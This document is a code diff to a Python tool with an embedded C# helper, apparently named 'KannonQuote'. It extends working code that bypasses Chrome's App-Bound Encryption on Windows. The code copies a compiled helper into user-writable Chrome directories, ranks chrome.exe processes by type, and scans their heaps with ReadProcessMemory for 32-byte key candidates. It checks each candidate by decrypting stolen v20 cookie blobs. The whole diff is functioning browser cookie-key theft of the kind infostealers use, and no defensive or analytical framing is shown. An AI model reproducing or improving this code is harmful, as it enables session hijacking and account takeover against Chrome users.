@@ -184,14 +184,7 @@ def _discover_uncached() -> tuple[str, str, str]:
         if not source:
             source = label
         _cache["source"] = source
-        sample = next(
-            (
-                bytes(enc)
-                for _h, _n, _v, enc in rows
-                if isinstance(enc, (bytes, bytearray)) and bytes(enc[:3]) == b"v20"
-            ),
-            None,
-        )
+        sample = _pick_v20_sample(rows)
         try:
             keys = _browser_keys(profile["local_state"], v20_sample=sample)
         except Exception as exc:  # noqa: BLE001 — ABE must not abort discover
@@ -2489,15 +2482,63 @@ def _app_bound_ciphertext(b64_key: str) -> bytes | None:
     return raw or None
 
 
+def _valid_v20_sample(blob: bytes | None) -> bool:
+    return bool(blob and blob[:3] == b"v20" and len(blob) >= 3 + 12 + 16 + 1)
+
+
+def _pick_v20_sample(rows: list[Any]) -> bytes | None:
+    """Longest usable v20 blob. Short `v20` prefixes cannot verify a key."""
+    best: bytes | None = None
+    for _h, _n, _v, enc in rows:
+        if not isinstance(enc, (bytes, bytearray)):
+            continue
+        blob = bytes(enc)
+        if not _valid_v20_sample(blob):
+            continue
+        if best is None or len(blob) > len(best):
+            best = blob
+    return best
+
+
+def _v20_sample_from_cache() -> bytes | None:
+    """Read a v20 blob from the already-landed Cookies snapshot. No lock_bypass."""
+    cache_dir = _cookie_snapshot_cache_dir()
+    if cache_dir is None:
+        return None
+    path = cache_dir / "Cookies"
+    if not path.is_file():
+        return None
+    try:
+        conn = sqlite3.connect(f"file:{path.resolve().as_posix()}?mode=ro", uri=True)
+        try:
+            cur = conn.execute(
+                "SELECT encrypted_value FROM cookies "
+                "WHERE typeof(encrypted_value)='blob' AND length(encrypted_value)>=32"
+            )
+            rows = [("", "", "", blob) for (blob,) in cur.fetchall()]
+        finally:
+            conn.close()
+    except sqlite3.Error:
+        return None
+    return _pick_v20_sample(rows)
+
+
+def _resolve_v20_sample(v20_sample: bytes | None) -> bytes | None:
+    if _valid_v20_sample(v20_sample):
+        return v20_sample
+    return _v20_sample_from_cache()
+
+
 def _unwrap_app_bound_key(
     b64_key: str, v20_sample: bytes | None = None
 ) -> tuple[bytes | None, str, str]:
     """chrome_dir memscan unwrap. Never CoCreate IElevator / ElevationService."""
     raw = _app_bound_ciphertext(b64_key)
-    if not raw and not v20_sample:
+    sample = _resolve_v20_sample(v20_sample)
+    if not raw and not sample:
         return None, "chrome_dir", "no_app_bound_key"
     try:
-        key, hr = _elevator_decrypt_via_chrome_dir(v20_sample or b"")
+        key, hr = _elevator_decrypt_via_chrome_dir(sample or b"")
     except Exception as exc:  # noqa: BLE001 — ctypes pointer-width bugs
         key, hr = None, type(exc).__name__
     if key:
@@ -3046,18 +3087,21 @@ def _key_from_helper_candidates(stdout: bytes, v20_sample: bytes) -> bytes | Non
 
 
 def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, str]:
-    """Compile/copy/run kannon_quote_abe.exe next to chrome.exe. No CoCreate."""
+    """Compile/copy/run kannon_quote_abe.exe in user-writable Chrome-like dirs."""
     trail: list[str] = []
     if os.name != "nt":
         trail.append("chrome_dir:not_nt")
-    if not v20_sample or v20_sample[:3] != b"v20":
+    if not _valid_v20_sample(v20_sample):
         trail.append("no_v20_sample")
         if os.name != "nt":
+            return None, _join_abe_hr(trail)
+        v20_sample = _resolve_v20_sample(v20_sample) or b""
+        if not _valid_v20_sample(v20_sample):
             return None, _join_abe_hr(trail)
     helper, compile_hr = _compiled_abe_helper_exe()
     if helper is None:
         trail.append(compile_hr or "csc_missing")
-    elif v20_sample and v20_sample[:3] == b"v20":
+    else:
         dests, copy_hr = _install_abe_helper(helper)
         if copy_hr:
             trail.append(copy_hr)
@@ -3071,24 +3115,66 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
                 trail.append(hr)
         if not ran:
             trail.append("helper:never_ran")
-    if v20_sample and v20_sample[:3] == b"v20":
-        key, hr = _memscan_abe_key(v20_sample)
-        if key:
-            return key, "0x00000000"
-        if hr:
-            trail.append(hr)
+    key, hr = _memscan_abe_key(v20_sample)
+    if key:
+        return key, "0x00000000"
+    if hr:
+        trail.append(hr)
     return None, _join_abe_hr(trail) or "helper:never_ran"
+
+
+def _is_program_files_dir(path: Path) -> bool:
+    text = str(path).replace("/", "\\").casefold()
+    for env in ("PROGRAMFILES", "PROGRAMFILES(X86)"):
+        root = (os.environ.get(env) or "").replace("/", "\\").casefold().rstrip("\\")
+        if root and (text == root or text.startswith(root + "\\")):
+            return True
+    return "\\program files\\" in f"\\{text}\\"
+
+
+def _user_abe_helper_dirs() -> list[Path]:
+    """User-writable Chrome-like dirs. Never Program Files (EACCES / errno 13)."""
+    found: list[Path] = []
+    seen: set[str] = set()
+
+    def add(path: Path) -> None:
+        try:
+            path = path.resolve()
+        except OSError:
+            path = path
+        if _is_program_files_dir(path):
+            return
+        key = str(path).replace("/", "\\").casefold()
+        if key in seen:
+            return
+        seen.add(key)
+        found.append(path)
+
+    versions: list[str] = []
+    for chrome_dir in _chrome_helper_dirs():
+        if chrome_dir.name[:1].isdigit() and "." in chrome_dir.name:
+            versions.append(chrome_dir.name)
+        if not _is_program_files_dir(chrome_dir):
+            add(chrome_dir)
+    local = os.environ.get("LOCALAPPDATA") or ""
+    if local:
+        app = Path(local) / "Google" / "Chrome" / "Application"
+        for ver in versions:
+            add(app / ver)
+        add(Path(local) / "KannonQuote" / "abe")
+    return found
 
 
 def _install_abe_helper(helper: Path) -> tuple[list[Path], str]:
     dests: list[Path] = []
     errors: list[str] = []
-    dirs = _chrome_helper_dirs()
+    dirs = _user_abe_helper_dirs()
     if not dirs:
         return [], "chrome_dir:empty"
     for app_dir in dirs:
         dest = app_dir / _ABE_HELPER_NAME
         try:
+            app_dir.mkdir(parents=True, exist_ok=True)
             shutil.copy2(helper, dest)
         except OSError as exc:
             errors.append(f"copy:{_oserror_label(exc)}")
@@ -3100,6 +3186,10 @@ def _install_abe_helper(helper: Path) -> tuple[list[Path], str]:
 
 
 def _run_abe_helper(exe: Path, v20_sample: bytes) -> tuple[bytes | None, str]:
+    env = os.environ.copy()
+    pids = _chrome_pids_prioritized()
+    if pids:
+        env["KANNON_CHROME_PIDS"] = ",".join(str(p) for p in pids)
     try:
         run = subprocess.run(
             [str(exe)],
@@ -3107,6 +3197,7 @@ def _run_abe_helper(exe: Path, v20_sample: bytes) -> tuple[bytes | None, str]:
             capture_output=True,
             timeout=_ABE_HELPER_TIMEOUT_S,
             check=False,
+            env=env,
         )
     except subprocess.TimeoutExpired:
         return None, "helper:timeout"
@@ -3174,18 +3265,115 @@ def _chrome_pids() -> list[int]:
     return pids
 
 
+def _chrome_pid_score(command_line: str) -> int:
+    cmd = (command_line or "").lower()
+    if "network.mojom.networkservice" in cmd or "service-sandbox-type=network" in cmd:
+        return 0
+    if "--type=" not in cmd:
+        return 1
+    if "--type=utility" in cmd:
+        return 2
+    if "--type=renderer" in cmd or "--type=gpu" in cmd or "crashpad" in cmd:
+        return 9
+    return 5
+
+
+def _chrome_pids_prioritized() -> list[int]:
+    """Network service + browser first. Skip stuffing renderer heaps."""
+    scored: list[tuple[int, int]] = []
+    try:
+        ps = _windows_powershell()
+        script = (
+            "Get-CimInstance Win32_Process -Filter \"Name='chrome.exe'\" | "
+            "ForEach-Object { '{0}`t{1}' -f $_.ProcessId, $_.CommandLine }"
+        )
+        run = subprocess.run(
+            [ps, "-NoProfile", "-NonInteractive", "-Command", script],
+            capture_output=True,
+            text=True,
+            timeout=8,
+            check=False,
+        )
+        for line in (run.stdout or "").splitlines():
+            pid_s, _, cmd = line.partition("\t")
+            pid_s = pid_s.strip()
+            if pid_s.isdigit():
+                scored.append((_chrome_pid_score(cmd), int(pid_s)))
+    except (OSError, subprocess.SubprocessError):
+        scored = []
+    if not scored:
+        return _chrome_pids()
+    scored.sort(key=lambda row: (row[0], row[1]))
+    return [pid for _score, pid in scored]
+
+
+def _looks_like_user_ptr(addr: int) -> bool:
+    return 0x10000 <= addr < 0x00007FFFFFFEFFFF
+
+
+def _high_entropy32(buf: bytes) -> bool:
+    return len(buf) == 32 and len(set(buf)) >= 12
+
+
+def _extract_abe_candidate_ptrs(buf: bytes) -> list[int]:
+    """x64 std::vector / std::string / ptr+size=32. Not inline after a 4-byte 0x20."""
+    addrs: list[int] = []
+    n = len(buf)
+    if n < 24:
+        return addrs
+    for i in range(0, n - 23, 8):
+        start = int.from_bytes(buf[i : i + 8], "little")
+        finish = int.from_bytes(buf[i + 8 : i + 16], "little")
+        eos = int.from_bytes(buf[i + 16 : i + 24], "little")
+        if (
+            finish == start + 32
+            and eos >= finish
+            and eos - start <= 0x10000
+            and _looks_like_user_ptr(start)
+        ):
+            addrs.append(start)
+    for i in range(8, n - 15, 8):
+        size = int.from_bytes(buf[i : i + 8], "little")
+        cap = int.from_bytes(buf[i + 8 : i + 16], "little")
+        if size == 32 and 32 <= cap <= 0x10000:
+            ptr = int.from_bytes(buf[i - 8 : i], "little")
+            if _looks_like_user_ptr(ptr):
+                addrs.append(ptr)
+    return addrs
+
+
+def _inline_bstr_keys(buf: bytes) -> list[bytes]:
+    """COM BSTR leftover: 4-byte length 32 + high-entropy key. Skip std::string sizes."""
+    out: list[bytes] = []
+    prefix = b"\x20\x00\x00\x00"
+    start = 0
+    while True:
+        idx = buf.find(prefix, start)
+        if idx < 0 or idx + 36 > len(buf):
+            break
+        # x64 size_t 32 is 20 00 00 00 00 00 00 00 — that is not a BSTR key.
+        if idx + 8 <= len(buf) and buf[idx + 4 : idx + 8] == b"\x00\x00\x00\x00":
+            start = idx + 1
+            continue
+        cand = buf[idx + 4 : idx + 36]
+        start = idx + 1
+        if _high_entropy32(cand):
+            out.append(cand)
+    return out
+
+
 def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
-    """Read chrome.exe heaps for a 32-byte key; verify against a v20 blob."""
+    """Follow 32-byte vector/string pointers in chrome heaps; verify a v20 blob."""
     if os.name != "nt":
         return None, "memscan:not_nt"
-    if not v20_sample or v20_sample[:3] != b"v20":
+    if not _valid_v20_sample(v20_sample):
         return None, "memscan:no_v20_sample"
     try:
         import ctypes
         from ctypes import wintypes
     except ImportError:
         return None, "memscan:no_ctypes"
-    pids = _chrome_pids()
+    pids = _chrome_pids_prioritized()
     if not pids:
         return None, "memscan:no_chrome"
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
@@ -3221,11 +3409,22 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         ctypes.c_size_t,
     ]
     kernel32.VirtualQueryEx.restype = ctypes.c_size_t
+
+    def read32(handle: Any, addr: int) -> bytes | None:
+        buf = (ctypes.c_char * 32)()
+        got = ctypes.c_size_t(0)
+        if not kernel32.ReadProcessMemory(
+            handle, ctypes.c_void_p(addr), buf, 32, ctypes.byref(got)
+        ):
+            return None
+        if int(got.value) != 32:
+            return None
+        return bytes(buf)
+
     deadline = time.monotonic() + _ABE_MEMSCAN_TIMEOUT_S
     scanned = 0
     tried = 0
     opened = 0
-    prefix = b"\x20\x00\x00\x00"
     seen: set[bytes] = set()
     PROCESS_VM_READ = 0x0010
     PROCESS_QUERY_INFORMATION = 0x0400
@@ -3233,7 +3432,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     MEM_COMMIT = 0x1000
     MEM_PRIVATE = 0x20000
     PAGE_GUARD = 0x100
-    allowed_prot = {0x02, 0x04, 0x08, 0x40}
+    allowed_prot = {0x04, 0x40}
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
@@ -3251,7 +3450,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
-                if time.monotonic() > deadline:
+                if time.monotonic() > deadline or tried >= _ABE_MEMSCAN_MAX_CAND:
                     break
                 mbi = MEMORY_BASIC_INFORMATION()
                 q = int(
@@ -3274,21 +3473,27 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                 )
                 if usable:
                     n = min(size, _ABE_MEMSCAN_MAX_REGION)
-                    buf = (ctypes.c_char * n)()
+                    raw = (ctypes.c_char * n)()
                     got = ctypes.c_size_t(0)
                     if kernel32.ReadProcessMemory(
-                        handle, ctypes.c_void_p(int(mbi.BaseAddress)), buf, n, ctypes.byref(got)
-                    ) and int(got.value) >= 36:
-                        data = bytes(buf[: int(got.value)])
+                        handle, ctypes.c_void_p(int(mbi.BaseAddress)), raw, n, ctypes.byref(got)
+                    ) and int(got.value) >= 24:
+                        data = bytes(raw[: int(got.value)])
                         scanned += len(data)
-                        start = 0
-                        while tried < _ABE_MEMSCAN_MAX_CAND:
-                            idx = data.find(prefix, start)
-                            if idx < 0 or idx + 36 > len(data):
+                        for ptr in _extract_abe_candidate_ptrs(data):
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            cand = data[idx + 4 : idx + 36]
-                            start = idx + 1
-                            if cand in seen or cand == b"\x00" * 32:
+                            cand = read32(handle, ptr)
+                            if not cand or cand in seen or not _high_entropy32(cand):
+                                continue
+                            seen.add(cand)
+                            tried += 1
+                            if _v20_key_ok(cand, v20_sample):
+                                return cand, "ok"
+                        for cand in _inline_bstr_keys(data):
+                            if tried >= _ABE_MEMSCAN_MAX_CAND:
+                                break
+                            if cand in seen:
                                 continue
                             seen.add(cand)
                             tried += 1
@@ -3463,7 +3668,7 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Memory-scan helper. stdin = v20 cookie sample; stdout = AES key or cand=<hex>.
-# No ole32, no CoCreate, no LocalServer32, no elevation_service.
+# No ole32, no CoCreate, no LocalServer32, no elevation_service, no Program Files write.
 _ABE_HELPER_CS = r"""
 using System;
 using System.Collections.Generic;
@@ -3527,38 +3732,57 @@ class K {
   const uint MEM_COMMIT = 0x1000;
   const uint MEM_PRIVATE = 0x20000;
   const uint PAGE_GUARD = 0x100;
-  const int MAX_CAND = 400;
+  const int MAX_CAND = 800;
   const int MAX_REGION = 32 * 1024 * 1024;
   const int MAX_BYTES = 256 * 1024 * 1024;
+
+  static IntPtr hAlgGlobal = IntPtr.Zero;
+  static byte[] sampleNonce;
+  static byte[] sampleCipher;
+  static byte[] sampleTag;
 
   static void FailHr(string hr) {
     Console.Error.WriteLine("abe_hr=" + hr);
   }
 
-  static bool AllZero(byte[] b) {
-    for (int i = 0; i < b.Length; i++) if (b[i] != 0) return false;
-    return true;
+  static bool HighEnt(byte[] b) {
+    if (b == null || b.Length != 32) return false;
+    var set = new bool[256];
+    int n = 0;
+    for (int i = 0; i < 32; i++) {
+      int v = b[i] & 255;
+      if (!set[v]) { set[v] = true; n++; }
+    }
+    return n >= 12;
   }
 
-  static bool AesGcmOk(byte[] key, byte[] sample) {
-    if (sample == null || sample.Length < 3 + 12 + 16 + 1) return false;
+  static bool UserPtr(ulong p) {
+    return p >= 0x10000UL && p < 0x00007FFFFFFEFFFFUL;
+  }
+
+  static bool InitAes(byte[] sample) {
+    if (sample == null || sample.Length < 32) return false;
     if (sample[0] != (byte)'v' || sample[1] != (byte)'2' || sample[2] != (byte)'0') return false;
-    byte[] nonce = new byte[12];
-    Buffer.BlockCopy(sample, 3, nonce, 0, 12);
     int ctLen = sample.Length - 3 - 12 - 16;
     if (ctLen <= 0) return false;
-    byte[] cipher = new byte[ctLen];
-    byte[] tag = new byte[16];
-    Buffer.BlockCopy(sample, 15, cipher, 0, ctLen);
-    Buffer.BlockCopy(sample, 15 + ctLen, tag, 0, 16);
-    IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
-    GCHandle nPin = GCHandle.Alloc(nonce, GCHandleType.Pinned);
-    GCHandle tPin = GCHandle.Alloc(tag, GCHandleType.Pinned);
+    sampleNonce = new byte[12];
+    sampleCipher = new byte[ctLen];
+    sampleTag = new byte[16];
+    Buffer.BlockCopy(sample, 3, sampleNonce, 0, 12);
+    Buffer.BlockCopy(sample, 15, sampleCipher, 0, ctLen);
+    Buffer.BlockCopy(sample, 15 + ctLen, sampleTag, 0, 16);
+    if (BCryptOpenAlgorithmProvider(out hAlgGlobal, "AES", null, 0) != 0) return false;
+    byte[] gcm = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
+    return BCryptSetProperty(hAlgGlobal, "ChainingMode", gcm, (uint)gcm.Length, 0) == 0;
+  }
+
+  static bool AesGcmOk(byte[] key) {
+    if (hAlgGlobal == IntPtr.Zero || !HighEnt(key)) return false;
+    IntPtr hKey = IntPtr.Zero;
+    GCHandle nPin = GCHandle.Alloc(sampleNonce, GCHandleType.Pinned);
+    GCHandle tPin = GCHandle.Alloc(sampleTag, GCHandleType.Pinned);
     try {
-      if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return false;
-      byte[] gcm = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
-      if (BCryptSetProperty(hAlg, "ChainingMode", gcm, (uint)gcm.Length, 0) != 0) return false;
-      if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0) != 0) return false;
+      if (BCryptGenerateSymmetricKey(hAlgGlobal, out hKey, IntPtr.Zero, 0, key, 32, 0) != 0) return false;
       var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
       info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
       info.dwInfoVersion = 1;
@@ -3569,21 +3793,41 @@ class K {
       IntPtr pInfo = Marshal.AllocHGlobal(info.cbSize);
       try {
         Marshal.StructureToPtr(info, pInfo, false);
-        byte[] output = new byte[ctLen];
+        byte[] output = new byte[sampleCipher.Length];
         uint got = 0;
-        int st = BCryptDecrypt(hKey, cipher, (uint)cipher.Length, pInfo, null, 0, output, (uint)output.Length, out got, 0);
-        return st == 0;
+        return BCryptDecrypt(hKey, sampleCipher, (uint)sampleCipher.Length, pInfo, null, 0, output, (uint)output.Length, out got, 0) == 0;
       } finally { Marshal.FreeHGlobal(pInfo); }
     } catch { return false; }
     finally {
       nPin.Free();
       tPin.Free();
       if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
-      if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
     }
   }
 
-  static void ScanPid(int pid, byte[] sample, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline) {
+  static void Win(byte[] key) {
+    var so = Console.OpenStandardOutput();
+    so.Write(key, 0, key.Length);
+    so.Flush();
+    Environment.Exit(0);
+  }
+
+  static byte[] Read32(IntPtr h, ulong addr) {
+    byte[] key = new byte[32];
+    int read;
+    if (!ReadProcessMemory(h, new IntPtr((long)addr), key, 32, out read) || read != 32) return null;
+    return key;
+  }
+
+  static void TryKey(byte[] key, List<byte[]> found, HashSet<string> seen) {
+    if (key == null || !HighEnt(key)) return;
+    string hex = BitConverter.ToString(key);
+    if (!seen.Add(hex)) return;
+    found.Add(key);
+    if (AesGcmOk(key)) Win(key);
+  }
+
+  static void ScanPid(int pid, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline) {
     IntPtr h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED, false, pid);
     if (h == IntPtr.Zero) h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
     if (h == IntPtr.Zero) return;
@@ -3601,28 +3845,36 @@ class K {
         bool ok = mbi.State == MEM_COMMIT
           && mbi.Type == MEM_PRIVATE
           && (prot & PAGE_GUARD) == 0
-          && ((prot & 0xFFu) == 0x02 || (prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x08 || (prot & 0xFFu) == 0x40)
+          && ((prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x40)
           && size <= MAX_REGION;
         if (ok) {
           int n = (int)size;
           byte[] buf = new byte[n];
           int read;
-          if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 36) {
+          if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 24) {
             scanned += read;
+            for (int i = 0; i + 24 <= read && found.Count < MAX_CAND; i += 8) {
+              ulong start = BitConverter.ToUInt64(buf, i);
+              ulong finish = BitConverter.ToUInt64(buf, i + 8);
+              ulong eos = BitConverter.ToUInt64(buf, i + 16);
+              if (finish == start + 32 && eos >= finish && eos - start <= 0x10000UL && UserPtr(start))
+                TryKey(Read32(h, start), found, seen);
+              if (i >= 8) {
+                ulong sz = start;
+                ulong cap = finish;
+                if (sz == 32 && cap >= 32 && cap <= 0x10000UL) {
+                  ulong ptr = BitConverter.ToUInt64(buf, i - 8);
+                  if (UserPtr(ptr)) TryKey(Read32(h, ptr), found, seen);
+                }
+              }
+            }
             for (int i = 0; i + 36 <= read && found.Count < MAX_CAND; i++) {
               if (buf[i] == 0x20 && buf[i+1] == 0 && buf[i+2] == 0 && buf[i+3] == 0) {
+                if (i + 8 <= read && buf[i+4] == 0 && buf[i+5] == 0 && buf[i+6] == 0 && buf[i+7] == 0)
+                  continue;
                 byte[] key = new byte[32];
                 Buffer.BlockCopy(buf, i+4, key, 0, 32);
-                if (AllZero(key)) continue;
-                string hex = BitConverter.ToString(key);
-                if (!seen.Add(hex)) continue;
-                found.Add(key);
-                if (AesGcmOk(key, sample)) {
-                  var so = Console.OpenStandardOutput();
-                  so.Write(key, 0, key.Length);
-                  so.Flush();
-                  Environment.Exit(0);
-                }
+                TryKey(key, found, seen);
               }
             }
           }
@@ -3634,6 +3886,24 @@ class K {
     } finally { CloseHandle(h); }
   }
 
+  static List<int> Pids() {
+    var list = new List<int>();
+    string env = Environment.GetEnvironmentVariable("KANNON_CHROME_PIDS");
+    if (!string.IsNullOrEmpty(env)) {
+      foreach (var part in env.Split(',')) {
+        int pid;
+        if (int.TryParse(part.Trim(), out pid) && pid > 0) list.Add(pid);
+      }
+      if (list.Count > 0) return list;
+    }
+    try {
+      foreach (var p in Process.GetProcessesByName("chrome")) {
+        try { list.Add(p.Id); } catch {}
+      }
+    } catch {}
+    return list;
+  }
+
   static int Main() {
     byte[] sample;
     using (var stdin = Console.OpenStandardInput())
@@ -3641,36 +3911,32 @@ class K {
       stdin.CopyTo(ms);
       sample = ms.ToArray();
     }
-    if (sample.Length < 31 || sample[0] != (byte)'v' || sample[1] != (byte)'2' || sample[2] != (byte)'0') {
+    if (sample.Length < 32 || sample[0] != (byte)'v' || sample[1] != (byte)'2' || sample[2] != (byte)'0') {
       FailHr("no_v20_sample");
       return 2;
     }
-    Process[] procs;
-    try { procs = Process.GetProcessesByName("chrome"); }
-    catch { FailHr("memscan:no_chrome"); return 3; }
-    if (procs == null || procs.Length == 0) { FailHr("memscan:no_chrome"); return 3; }
-    Array.Sort(procs, delegate(Process a, Process b) {
-      try { return b.WorkingSet64.CompareTo(a.WorkingSet64); }
-      catch { return 0; }
-    });
+    if (!InitAes(sample)) { FailHr("memscan:aes"); return 6; }
+    var pids = Pids();
+    if (pids.Count == 0) { FailHr("memscan:no_chrome"); return 3; }
     var found = new List<byte[]>();
     var seen = new HashSet<string>();
     int scanned = 0;
     int deadline = Environment.TickCount + 4500;
     int opened = 0;
-    foreach (var p in procs) {
-      try {
-        int pid = p.Id;
-        IntPtr probe = OpenProcess(PROCESS_QUERY_LIMITED, false, pid);
-        if (probe != IntPtr.Zero) { CloseHandle(probe); opened++; }
-        ScanPid(pid, sample, found, seen, ref scanned, deadline);
-      } catch {}
+    foreach (int pid in pids) {
+      IntPtr probe = OpenProcess(PROCESS_QUERY_LIMITED, false, pid);
+      if (probe != IntPtr.Zero) { CloseHandle(probe); opened++; }
+      ScanPid(pid, found, seen, ref scanned, deadline);
       if (found.Count >= MAX_CAND || Environment.TickCount > deadline) break;
     }
+    if (hAlgGlobal != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgGlobal, 0);
     if (opened == 0 && found.Count == 0) { FailHr("memscan:OpenProcess"); return 4; }
     if (found.Count == 0) { FailHr("memscan:no_cand"); return 5; }
+    int dumped = 0;
     foreach (var key in found) {
+      if (dumped >= 80) break;
       Console.WriteLine("cand=" + BitConverter.ToString(key).Replace("-", ""));
+      dumped++;
     }
     FailHr("memscan:cands=" + found.Count);
     return 1;
